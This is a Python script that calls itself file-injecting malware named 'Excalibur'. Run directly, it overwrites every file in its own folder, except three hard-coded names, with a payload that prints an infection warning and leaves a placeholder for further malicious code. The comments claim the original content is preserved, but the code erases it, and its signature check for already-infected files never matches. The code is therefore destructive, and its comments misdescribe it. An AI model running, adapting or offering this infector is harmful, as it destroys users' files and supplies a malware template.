import os
import sys


class Excalibur:
    """ This class represents the code injecting malware.
    """

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @property
    def malicious_code(self):
        """ Malicious code. In the case of this file
        injector it is this whole file.
        """
        malicious_code = '''
# Display a warning message when the infected file is executed
def show_warning():
    print("Warning: This file has been infected!")

# Call the show_warning function
show_warning()

# Your additional malicious code goes here
'''

        return malicious_code

    def infect_files_in_folder(self, path):
        """ Perform file infection on all files in the
        given directory specified by path.

        :param str path: Path of the folder to be infected.
        :returns: Number of injected files (`int`).
        """
        num_infected_files = 0
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            # Exclude specific files from being infected
            if file in ['file1.txt', 'file2.py', 'file3.exe']:
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        # Inject each file in the directory.
        for file in files:
            print('Infecting file:', file)

            # Read the content of the original file.
            with open(file, 'r') as infected_file:
                file_content = infected_file.read()
            # Check whether the file was already infected by scanning
            # the injection signature in this file. If so, skip the file.
            if "INJECTION SIGNATURE" in file_content:
                continue

            # Write the original and malicious part into the file.
            with open(file, 'w') as infected_file:
                infected_file.write(self.malicious_code)

            num_infected_files += 1

        return num_infected_files


if __name__ == '__main__':
    # Create file injector.
    code_injector = Excalibur('Excalibur')

    # Infect all files in the same folder.
    path = os.path.dirname(os.path.abspath(sys.argv[0]))
    NUMBER_INFECTED_FILES = code_injector.infect_files_in_folder(path)

    print('Number of infected files:', NUMBER_INFECTED_FILES)
